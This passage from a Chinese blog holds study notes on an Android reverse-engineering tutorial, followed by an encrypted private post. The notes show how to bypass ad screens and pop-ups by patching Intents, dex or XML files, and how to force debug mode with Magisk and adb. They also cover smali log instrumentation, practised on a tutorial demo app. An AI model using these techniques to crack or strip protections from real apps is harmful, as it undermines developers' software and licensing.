<tbody><tr>
<td align="center">Activity(活动)</td>
<td align="center">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>
</tr>
<tr>
<td align="center">Service(服务)</td>
<td align="center">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td>
</tr>
<tr>
<td align="center">Broadcast Receiver(广播接收器)</td>
<td align="center">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>
</tr>
<tr>
<td align="center">Content Provider(内容提供者)</td>
<td align="center">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>
</tr>
</tbody></table>
<h4 id="activity的切换"><a href="#activity的切换" class="headerlink" title="activity的切换"></a>activity的切换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:label=<span class="string">&quot;@string/app_name&quot;</span>  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span>&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：<span class="literal">true</span>允许被启动；<span class="literal">false</span>不允许被启动--&gt;</span><br><span class="line">    &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class="line">    &lt;intent-filter&gt;  </span><br><span class="line">        &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class="line">        &lt;action  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class="line">        &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class="line">        &lt;category  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class="line">    &lt;/intent-filter&gt;  </span><br><span class="line">&lt;/activity&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure>

<p>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity</p>
<p>修改方法：<br>1.修改加载时间<br>2.Acitivity切换定位，修改Intent的Activity类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (position) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class="line">        it.getContext().startActivity(intent);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class="line">        it.getContext().startActivity(intent2);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  <span class="comment">//new一个Intent，</span></span><br><span class="line">        intent3.setClass(it.getContext(), AdActivity.class);  <span class="comment">//传入要切换的Acitivity的类名</span></span><br><span class="line">        it.getContext().startActivity(intent3);  <span class="comment">//启动对应的Activity</span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class="line">        it.getContext().startActivity(intent4);  </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h3><table>
<thead>
<tr>
<th align="center">函数名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onCreate()</td>
<td align="center">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
</tr>
<tr>
<td align="center">onStart()</td>
<td align="center">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
</tr>
<tr>
<td align="center">onResume()</td>
<td align="center">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
</tr>
<tr>
<td align="center">onPause()</td>
<td align="center">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
</tr>
<tr>
<td align="center">onStop()</td>
<td align="center">这个方法是在Activity完全不可见的时候调用的。</td>
</tr>
<tr>
<td align="center">onDestroy()</td>
<td align="center">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
</tr>
<tr>
<td align="center">onRestart()</td>
<td align="center">当Activity从停止stop状态恢进入start状态时调用状态。</td>
</tr>
</tbody></table>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319154909284.png" alt="image-20230319154909284" style="zoom:50%;" />

<h3 id="弹窗定位-amp-堆栈分析"><a href="#弹窗定位-amp-堆栈分析" class="headerlink" title="弹窗定位&amp;堆栈分析"></a>弹窗定位&amp;堆栈分析</h3><p>修改方法：<br>1.修改xml中的versiocode<br>2.Hook弹窗(推荐算法助手开启弹窗定位)<br>3.修改dex弹窗代码<br>4.抓包修改响应体(也可以路由器拦截)</p>
<h3 id="布局优化"><a href="#布局优化" class="headerlink" title="布局优化"></a>布局优化</h3><p>1.开发者助手抓布局<br>2.MT管理器xml搜索定位<br>3.修改xml代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>

<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><ul>
<li>使用MT分析弹窗的activity</li>
<li>进入classes.dex文件中搜索对应activity</li>
<li>进行对应修改</li>
<li>或者使用算法助手hook弹窗，或者看调用堆栈修改代码</li>
<li>或者开发助手布局查看获取ID，xml搜索进行修改（注意设置ID转名称）</li>
</ul>
<h2 id="1000-7-x3D-？-amp-动态调试-amp-Log插桩"><a href="#1000-7-x3D-？-amp-动态调试-amp-Log插桩" class="headerlink" title="1000-7&#x3D;？&amp;动态调试&amp;Log插桩"></a>1000-7&#x3D;？&amp;动态调试&amp;Log插桩</h2><p><a href="https://www.52pojie.cn/thread-1714727-1-1.html">《安卓逆向这档事》五、1000-7&#x3D;？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><del>感觉开始上难度了。。。</del></p>
<h3 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h3><p>了解并掌握动态调试<br>了解并掌握Log插桩</p>
<h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p>教程Demo<br>MT管理器&#x2F;NP管理器<br>jeb（相当于IDA java版）<br>雷电模拟器<br>XappDebug</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>什么是动态调试：动态调试是指自带的调试器跟踪自己软件的运行，可以在调试的过程中知道参数或者局部变量的值以及履清代码运行的先后顺序。多用于爆破注册码(CTF必备技能)</p>
<p>Log插桩:Log插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke-<span class="keyword">static</span> &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure>



<h3 id="动态调试步骤"><a href="#动态调试步骤" class="headerlink" title="动态调试步骤"></a>动态调试步骤</h3><h4 id="修改debug权限"><a href="#修改debug权限" class="headerlink" title="修改debug权限"></a>修改debug权限</h4><p>方法一:在AndroidManifest.xml里添加可调试权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android:debuggable=<span class="string">&quot;true&quot;</span> <span class="comment">//application里面修改</span></span><br></pre></td></tr></table></figure>

<p>方法二：XappDebug模块hook对应的app</p>
<p><a href="https://github.com/Palatis/XAppDebug">XappDebug</a></p>
<p>方法三：Magisk命令(重启失效)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.  adb shell #adb进入命令行模式</span><br><span class="line">2.  su #切换至超级用户</span><br><span class="line">3.  magisk resetprop ro.debuggable 1</span><br><span class="line">4.  stop;start; #一定要通过该方式重启</span><br></pre></td></tr></table></figure>

<p>方法四:刷入MagiskHide Props Config模块(比较麻烦）</p>
<h4 id="端口转发以及开启adb权限"><a href="#端口转发以及开启adb权限" class="headerlink" title="端口转发以及开启adb权限"></a>端口转发以及开启adb权限</h4><p>版本号点击七次开启开发者模式并开启adb调试权限</p>
<p>夜神模拟器：adb connect 127.0.0.1:62001</p>
<h4 id="下段点"><a href="#下段点" class="headerlink" title="下段点"></a>下段点</h4><p>ctrl+b下断点</p>
<h4 id="debug模式启动"><a href="#debug模式启动" class="headerlink" title="debug模式启动"></a>debug模式启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure>

<p>adb shell am start -D -n<br>adb shell am start -D -n 包名&#x2F;类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p>
<h4 id="Jeb附加调试进程"><a href="#Jeb附加调试进程" class="headerlink" title="Jeb附加调试进程"></a>Jeb附加调试进程</h4><p>激活jeb</p>
<p>这章云了。。。</p>
]]></content>
      <tags>
        <tag>安卓</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>internship_record</title>
    <url>/2023/03/14/internship-record/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3c2318b200af9cdf5a0ffd1ac38db12324766f52cb631a6a18c07c1dca15d003">7f5f45840a319ff1b11e31e6f9055829442b58400f62e69ca4fbef3680b89e97791459f6dfbbbd3fe7a420600eb0e2ad48eeb6cc5ace511cef594fe64754fc6a451db2e782fd51da352c967bb6d5c0e0847fd715da199950df56cfd92f0f2ed76b6a0682413ecb1e96977a38fb0accfc33a7ebdd17c8719544025558065197826bf55e4474ea9c1fe3bbccb82b5bc527f601c20ef689350fa946d612de6405e30be1d22dcf46c231c001a130b4671b3996ea0669430ed037230ce416b934a0a6e12c268af23a0259262cf2c0b4fb9db14f2ddaee319d2d0298ed65cae4fcb94e7ef42e3b4e087760ded26eb7211427fbf8bba70d6f71bd934e200c3697f17f45b7a58c00f59343a5c1040c8f51a397b3ebc00ed527331f1afdbdbce7048d48ae7cc8d315ce4d9abfb5522cf3fabf33160060e0ab15e00a18f4f3e4b7dad77ca5d8984730eafffc2c45291c033dd8efc0fa005bfd097c814988b2ad9fa77f9d884157acb5babd1d96f40d2c316897f2508ad797bb7c06d1dd80589ffee4cb819207d4cdbb16f7c276265c10fb5fa678d570a719b0ed31d69302b136db833f4284c62324bec3b3e3bc04fd24a4b8803f3160b6f396c9717b8abe2d2e27e7af4eebe9a68d9b8a66cfa05cb09597c3a1af053a199306c9983d29608bf6253a1ac5f1ab3dde04af99149ac047558b1d8d6eb423a5d07dd75fb2bc04fd0fd857b114f042dbdfeb592a1ab99c39f5844bad2187aa2abe44d3b15bf853e0a2a320a0ab53bb66ef0a7fb34c60bd12aed896a5b02fd6f22956aad1eb6b0c140f80b0297601f844367985471a58c514d304722d8b558b14983bb3c116343df73a585d84dc6a4b3262998b7f7183e9fa10c564b84263f7a995b9861c306e3fc9597e2d90bfd871287e96d10bd0ae21719d98113d0fb5898a305eb04ae9446960656fabfe2fa91003d01fdaf9c47854b06d695e75e4417090f28e3218ed15b2702269c728f3894e7a7dcd175b00351238871c81b37e5ea40f82b483d507e005de02b30336e255759508dc30cfd437693ca7791512c3b7a6b770fcc21092da95da3d2d2d4529a85701e28fd0a07441ef61e1ea8dfbf8d6addf9abea8a936d4969456c3724b13ccc2eff78297e3fb35a01ddcff7ec795c41803f147219532a419a046fcff40d59af2651b6e5460af3147a9731bef9750c510c27506f390d7515b628949c4cd31fd0c7937a6e998ec4040a0bd6cfcd0ecc1a23a905146e005c2deeed3b9ccb960573ae163944183b1296566c3cc432d17c647e5c4bbd6adaca1a06ecd1e1cfc432c9b22b88d0bc466e3d419ec579a9538abd8d2ad1b1c6bb9047429675a733bb3cfcf84af7f35b6028b75dc66d8ab50fbce2e746351c64799163ead670fe84b4e7e8725096062f358523377a351e445eb0f550ba48a0d265e4240d33539a27b73103c369d8d21291628963276797613e0b4d1380cd6c7db63ed24c0a2772b987a7d9c414a18264b17cdbe715afb40db0bc4965443f10b6d7d729ba692e31e29dd93e29e008c8b7cf7630f692ebb7156ca9013051ebb6ced93331ffeb72a342891602490b1d78027e32b555c849ed6310ac3e0696cc423f17a196b9bf1dd824b260356796b8c965a2292d4bf050d02a8d55ada36f7c26d0e06bececb75bb6aef40fcfe4a4a14526aae24272760053e549ccbc7fba45979620486f8d4d66c47e11a30432c4ae5de61178231b9235ca7a8c439de63c76001a20a5543900eb1bd752b9dddd207c07d5e0cac35d6995b0b9d50f099fec2f6db633ad6a478a1d6a420a704ea98b583e11bab4382597d6ef8021fb5391cb390844c32e0a593ae1749e639a7bbccc9b1e96de288ecc5f1a47e528987be58b3157341c0b00df7078e40b4ce552132b642ec2da05ee8fc98484c033c3469e8699080650de14cc578d030756b9e9b9652fe24e4ef4c1346bd1e50c355085869717087d010da35caa937c5d560e96e55b3917dafd63864af3b2aebad0501c667e24f061f302d4054ed3601617a810a54f97a98ca0bf6de52fb6f5facb16a8a25b1a4b19565337f76e166c61c305205d7f4a2fa2551099ffb7880d418b7f37b349a6b845f99173da6f7bae8e1723aebd2dbc60617ad7d787cad4c44e669de8ca6664014b2870ced3bd03eb05affb72039613e2fd88ca8ebf2a687123d06bd06b3b4229036c3722e1355d7c7e4934178ccd69215080ec41cf17b0832000349cfe59d81d330745dff3525d651ab7e7d12d7526c36661805969afa414f1af3d02fed27522c35e1e6a9ab9b735a61be7bea3bd0942c47f1cb24309a54c2f33ce5c631c1e3eb49863ba1d00f16ff6158127f915d0fd30f08e6999f61d31cbee68517300afcc1c03ec99847f621e924db1b4d8091c67fd0bd864d748729af481d0f979ba6a1f99a1d69a5888794e41c96385980b0feb0570def41542abb60ea80ba42fffe208c97f4ea6a96d65a753a288be49b35665de4a36d1ce96e4740f8211d0ee82e4c38d1ec6e610c82c85331061fb623bed43c346cf5bc50c8a30f7a66f25147eb538e99517509aa93821d29edc2d288d6f6b777d7fa95ae874d333d8826568bd550d724448240c38a7db55a4ad7df2a0c79d91e8408063aee59c002472c1aff0af3c52fdc1b5e7ebec8bf15d4c676906241debd0c64d1cb3ca6d33e67f6514dc0949cb8175efb4eee536268f6e5c03579e7d3a300c7d39647b606dca3adc5c02a8c0b138f254f582922450eab186f774a7706aa982b5db6d42c4aad2fdaa0436ad76a4a5481633e1db96451b301b2989f4591cee83d490ad0508add1d1388e60331a123ab70f8ab83c8e32ac413bc378fe549f34854205ad519d3e08f73661aec244896e4860aa5ffde93c8c45e3fae3734391a11f13b6604d788ade57c6c6cc9d5adadfc90e7ba2aeb6e09b5752d38db7398b9fbd4156bb42a2ea5e0b5e2d7a39f748f466d7f50bfc2dde8beb9e73c76b63b32d9704bc0830282ae1e6bcaace0e6ca75cf4482ad86987fe84f8fabfca0f27621eaa25cb27c587545a1dfd41fa9be8d986ff7b996ffbe50177c45e0ac0970cba88e4a2d8ec3d41537017eaacdd819abc50b8aa4619ff69ebfedc43cd0320e512168c5b5e10256fe843c3853c8b115d2d6b5e4c956ae5f6bcd3e9dc4984b9e1022c6e8d093140c76a48361a0372a62a5532e42b3636369ff2f0424ae0d8a9a1167c27a56f05c395156e223e68d1d02d647d7c12c3ca9c44d5bc1a2f9a0c7ee6dc851f76f5421d368a05207880f356ce43530d63802cdac20b2d72fc4f12b8c540d554b45eaa5dbdff42cff117686c74e584b40337261b42dba029ab14cda8c9ded667198468adfa01cccd618954edf0451e0b536596558ace9444bd9b2744f9ffa6ee3ea8c3976afeb8d7b40459b485259f94af4526ffe88e26bc8893292fea5e9e28b4bec20621da66cb3bddc0a9f5c045e06a47854d69cf8d2ea490f59a12a688d98b6976fd66ad08fe3bd4986fbea21c1430885010c3b725908e8e33c4ae95617cd6eae9405d8e7d946c32fcb23aefc1d96a89761afcdc247498798ce0cc1115fd442037927fa378d2c37753fea389435f53a297455f7ab7d5d99f0b8e302a8393d0739eabca014375dde7e6cc7a298dcc9e67f8605c70fdfa42b91898cbe29249a4f1057fc3118b6d5fd66789bc1059be1d634295339f402ae819c12d3767b815fe4b99fff1ba96151961046588ae8d06f4c30f104de9fed4e6464d464a2681871d19420b797388b4bebc82fe5d7b014c9eee2263965a58851c2615165ca1a2de0e7bd0ccdf246d491d5971996b48ae903474044f6ada68105da01df7300b0a5547030d516d4dd49aadc7d0a4fbbaed6f60b9f282d167827276d36ecda3ebde116e707f48d1d6fc253cec4269781f4f9ac10ffa20cdd01a5af5c6a85cf8d282d304eb1f66bd2401b516745778caa6025eabf6bbe1ca0901e6abdb1d61822c80164099cf01687fd085b73150305a22d4c55593c83b89804d2c74249b97ec1cada91e1b5e35662145891fcfcb2aa2ef3b2d496c67a89b6a78620871a598054ed80cd6986c3b3fe483ad005f18748e9c30a2575b9bd9f526f28ec9a74512565afa4ea334ba80ed5f7e2b0317d9296b8ca51cb546a34d2c0b1c69c602f542637683a543af7d1ee38d23f640970885240224b077660ca0ca09625fcae31092be624df877a68a40cef90080b7f3e17da4500745b84b36bdc2c39c9356d990b68f7b1c042d18a6cc6fc2748e8f189f898ca9470aaf7796c5c70263916b93abe6705b2d499dd61676aa4c192a2b157d9a82d2854ea4fbe291f89cf1e516dd1ea70ed614820e9b07bc5d346e3eac3b1b630b29110e52a94658d97f89244a72cb8d46a87ac6734372497679e610345a6e6f969d803b656e094b3bd6723669ce11c3c6a499b5cf3f2b254ace2ad3fb3d84ba1d43df19e54366629a35b766a4856029e0cc37409425f565c04c9bcb5a212eac8c4225bc2e7cc70aeb405ca6be3c37d747aa092cab335892e2b6632d3b0d4427e62791f4df7004dd0067feb76717f8d783b05f837a3154b1a27062b83c255f7af336c6485ecd489b539f8a07aaa725bd50bba06d16558065baa8df1c63dd454b18709e8fcb8a1520e1bc2db98b9031cfbb5cce6c587b500082cc7fc5db023bae78c330e93129a6b19a04a20fd5b258543fbd59a6d455bd199ffbba3d87654b09bef08dc98f35165302449eca89bc12c4d77db40454baddd1f69b448d4f5ffef6b6f153ecc1085a45ae3d2601b8b20ef1b3b8a2b9de6210705d3721a342df1f4acef42d13e948b66e9bed7f451366b9a87d5e7fed2210b8ddd7da6ca2c621148898bec001af8bc576004334002987d35b1404fd973f39ae4bedd8f02cc1e06c4a380206fc480741200c4da12460ea378e12d4686a684102b4c8461c1673589b6889aab7d84034a295d72c5b5d5e77afee16b878ee52dfec909c3eef0e3a3dac1453e8ffe78335973d98f6dfeab25370f3a4fdfb5eea5b83be57b33bc7c6f3401910c198e85a815aedba5b2a764606e53c86a180f8f3e817c376e151980dc6b9ec1b0db204808f79945670b9deca0b09414af9ba60409f8dd8b4394fb33a51949f8860dd764d89705f9f6f76a1826d3632ca369a7068d2220f97aeb88cf28ab62023ff7b0ddeb9184d632a7c223e7509e0c0b824c2356d2bb9e13e9a7fd0fc408b29a7c57cd9ceb567d81c5d5a90085e2480f59c07bfe08c0ba405a7498c4fc2e54c9632e425251e56704bdb9f7e171e918e8837640b09e69e58c81433fcdafe7e1ce8b5f3e5da0044a24588e37f5f73c086f5dfc2e4eca9d24f7de185db1f788e51ad5fdbbeb244f80639e569e22346c4d8c3aad0d9657959a5ed11c9032a3adae3ed7becf732133108f33365577da7b8eabd5de14fa3e5c7615fae2395b0a74a1bf9218c0f51e9e356f66dbaa88760eb6e612d6b93d38d7a067353b14b7e4f56892231ca61b3269f8cce584aa13aef748c165dd30a44ae093d2964dfa04331c04cdc6ca93d1f6a7b62607fdc2f8223debdb8c2147a2c3ad4f3cf4298e6d9fe85fe0a9184534f4a8f885312ed5642109849d671f44a11528f7afc7c9f62655c97b1465ffcd4d814d3b180b7616abc580477ff851f45ae639c9fae67ee7e0cccf534790968bed2b58b4cf766286094db88de6d57402f3ccf5897df473f46b76829f7ce0ce78e9130405e1a00a641263f9bf1741fbad2ecd01a38375a4408890f61af93e78672eede6c5285bd8f31f1405f53c9a4642cfa7755e2d1a86bc45e6731c1e6cab901fd454713ea1c67844f32782a7d7d6e94aef9c62a68ecd2388b073634e79746293cef20041425c8258666d8bbb729a6dc4533a25af717f0ddd3f651113bd5b1ec1fcada1af89e8a472cd44f59dacc0c4bfd10b4428967e17be54c97fbaf60bd3e1aa67b264b429f7ceadcce5c492cd0d02ae44c99a5ba6c8b6f23900ac779aab45f12a9581f5ac7f8d651bd435c00d737e521b15039a74bd5581da44663c3b0f60638192bc3d1f1a6cf95a8abc1a55fc89bf456676861f036c0517759ac651eebae72c6b64de933807b927ceb04c0b18c389ac544fac7759230f5d170fe364f48b2d7c61aedda9e579d4b53d2d23a9c5333830af7f446409c0faa222369cfbbc887d2ddbdcb0b1fb2bf43961a67209646ad0e427b2cd70ca9900aec3b9fb624212f20b5b1c298aa41d74047c5b27c630b6951fd5e1f81e98ff9228e7b85fd97040f765a2a9cc87b8de355ce8d52ae54ad316a13c69621a8257d5b7b8097b61ab306aecc687d049156360e9c9bc010c01e82ac316a37fff76c6b5db12adced0f2659294a6d1154917442560405d1135f59be6bd5a009a8d0307b51391c85e3fccf393a9f372159382aff7cfe6928fdf7b23bddeae6cbbf99d9feaf4f774c2ad06bf3065739161fe5d0a0ec24ec1a95477a5bfc2e211dc954e2b6e6377e1352890093b0922eb23fa614ad3f29874ca57537e14133e2a414e2b75a93d512b628b5af27f8a5f2e5c2220285ec11f942a4f172077fed0ebdab172dc1a711d6c01d760ebc69c0f1221497b42ee7df629bdf8c9a3b4783486ad52b72f53d41d702c44980a2811419a3ee96615e26daefb1071825aa85216c62db5e94ed7f70f968cea6c095c5c6d8537cee4867df84a517b18b71c16c2fd6770c2d13552b09b258d441d6802a43517ec00dd8fa1312b940ab88056a2f56decf011735932ebcec9961467091c7fef069eb5257bc5a4c291b89390add5beea8636d739471e4dc709396c692f3d1321d7c0a143e219114f7e5beea4c3222f926220ce0ab086e852903aed0b553cfb1d028f7c1bb5da79fe0593a2babfe2b5f4d98327fd6c253d73c84d081b00e4a7fde5613468ff67779be262ff6ed53d7f3cc977dae1c55a50425922e08e6b1eb020bb7ca74121cdb01d3d8ce4e303d17bdc4a2c3906409e9b1ee68b934905b67fc4493757dc1a0da79935aa9980018b5d77fbb86f4bc76aec1ee881ed657b3d2d789b0283584ea8b125c9dff7ffa5a96356032eb865e9fb4b159e7e2380a434cfbe792eb202e868373c886c7a3bf3099180b78169de37aff04f0e5e4a81ce50dc03e38638571f81bf90526803d4dd9d3c612b0d237ccd0920773c40043416897e296ad0a66a24390b7e88c805309cdb6ee669175853820d38915f1ccc449b42117ca5f5be46ed90d3d618458a6dc5aa2e93268260c0ab91b6e89d54ae31ff97ff5b7e14d5a32fb39332ac260713169309efb13fb03e7092a0753e02d9dd647ebaed715d3d9665f4ab11e31a3df6dd25a2f64e97ef2daa9ae5a6cd15695f888e2433ac8f947ceb54fadd50995db72f16ef73deb59cb107ceab657ccd5b25383bd7c3de16903cf35f4819a1ac700b630383351eb1387f8448038fe0d5747fc1446b3fd90c984ba9a729f7709a5a72c699b4002c738267adbdbdcbf9d619cdf12333539e15d482751530c569cdc9feadf7b06bdc14992991dcef4e7b31dcf0ecd5ef1f3a95e01cfc08830acb577e010edcc074c94a883b064609763852e04e2d034efbd9b9405999c9254089c4a5f2298fe6f8a72ce24edff6cdbf8bcda187f0eb422d05a561ab89aa3b08bfbab038a5c876dc87bf71174572335844bea832a4442224ca3b53102641642214a50e72e244c89f7f0b70aca1f9d1ff8e5e0cfe6c3e286685dd1c245eab7b7ef0e1e97460bfc9e21d9a3bfc0f9d9e6d5844644f2f1c07a0c773d025662a55854454e8f3b86568ed022aff35ed1482b0214e4c2e8fc3342013776374107f408522a55acb32cbe0d577d7464850224d9702f123f2274915ec0879cb975d866e42e3157b9e29777b6fcffd5990aa3a4713d77720edd0a59d68495ac0aa4be2fad9b6286f0e31e3b4ae1e2b952ced65d5f62801d9d645d1902a68484b4ecf053ef9f1c216cb099ac2a474e2860c7bb6475ddf20b20df405473db61053b8407c8958e17dfc8e9bef7c1ccbce1a7a341dd8ebe4e6f8dd383717facc6ae8a209671ddb299d915cfcfe74a2853fe95b6ef3277f13015727a448110140372ab7b4a49e4844c283480cc992edd19a136af5e043908302a3239a70a47e6dc26b5a13c8f4e636b23a6132b152d824704011034a10551519a72f295d1ac0f79a8055fccc2a9314485a29391f620d2042e0405fb7a9683eac6baeff0e250fae7477e9b66a372f7657821d0c115850d65bf226d7a7913a6d0d0cb927ff4e296a0c0bca5cb07ada298fbd0d13b1b54fab6f6a747500b1aad5520cb026401857c86b6515d794388fb931a3e756eb5dde21b53ab21855dd67bc6f2d41a666a76e90e200c14c772d7bfa0e95e12d55f90ca23d0ef8d21d34b680652a0723b4bfc8654e5974c488a5b7de870a5f44ec8e6e86045f0dd870e8f54c4124da4a4cebf28c4962b12c79a3c9fcbaae14ab63d748ad42df105b24ba4d17f1a187d980f3e6bca1f5d9a8e4a2ada1e4786d75af31e6ad92705a3fe240230805b45cb03e3f97e7bcae8be3b20bf826bbba392d60214b01ed55e43d2e3be30a03c3a4858d864e8b0e08184edebecf852cd430e4cc93f5a6fe1a6b14f6edf799d0f68871ab01f6be2a6d3f08633bff27b80cd9f8c54716be07c0d6fc8bb077b612536a3f69f01b8963adfffa5f4c3cc97cf233b68a92ccd98060d4c4258d5955f8126e7fac5cdd816b652a15fe98f3d3b0225e0564ae1a27f24176a38f280cd048d75186df63498434df4a1f4956ab8e67cc165c3d3a80b0641c35a239d7145887d8ba674de2534e0c4bf87eb9d6eba43e3ed30c927fb92dbfa5baaabeffa05a4c0fd698914fac567ac47f10d109dc1ac9a0bd99195f29ab00b2cc52c3caa58522af3a925929aecd8c58e4d83731e975bcfa9b6c46823e7ab7515077b3a7d2a7726d44502c62e62f3fd9947e3a3805c2556024467d97bd08c24dfb298a991a907fc959ec55948ec3bd6b69933805e505bdf1e405e813fd91699a1e63067fce78189598192223a803859472c0a0cf9ccbfcdd14f727328b62a9ffede8650e8e2652baf990825fecfddcab1785bdcb22b7e6c55bec287f09cafaab919abe106b2f698984d668d8bea6a8bb0828f44b36f9528be9907ff47a79c43131214b0f264d5f10fa8bbe3db277dce8e05126307985eba11dd8b9ce604a2adef661ac49e27fba85f3584fca35a03b6726ed95fc32fa35d83021d0ea753a9f0d628e5c52561162e8f5cefb92a5da3cfe66a6e0bda225399dee213109104cd7bff1199837d7bfadf55b02cb9d1fa54f36ce391d58847969080788771b0af1acb8063eddc213064ed73f5206031cd7ff97ce738b3088e08d4c7871b7d7b6ac013eabfcb66d0f2416304ae4944180cf30fded0d2485fa79d7be18f2087a3bccd61b2900e7d95192b40b749c37692852062c329783d9b1eb2369fec413174dd2476b5770d467aa2c9